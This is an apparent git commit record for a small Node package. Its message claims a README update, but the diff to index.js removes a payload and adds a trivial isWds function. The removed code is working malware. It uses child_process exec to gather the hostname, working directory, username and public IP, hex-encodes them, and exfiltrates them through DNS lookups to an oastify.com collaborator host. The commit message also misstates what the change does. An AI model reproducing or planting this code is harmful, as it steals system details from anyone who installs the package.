00eab55e3a32296c8030c15c058b8fc110f8e089
JakeClark <jakeclark38b@gmail.com>
2025-12-09 12:34:21 +0700

    Update README to include example usage for aggregate function

--- index.js
+++ index.js
@@ -1,13 +1,5 @@
-const { exec } = require("child_process");
-exec("a=$(hostname;pwd;whoami;echo 'linkanx';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $a.jm90wboytr298dd115yfp95r5ib8zx.oastify.com;done" , (error, data, getter) => {
-	if(error){
-		console.log("error",error.message);
-		return;
-	}
-	if(getter){
-		console.log(data);
-		return;
-	}
-	console.log(data);
+function isWds(string) {
+  return string === "WDS"
+}
 
-});
+module.exports = isWds
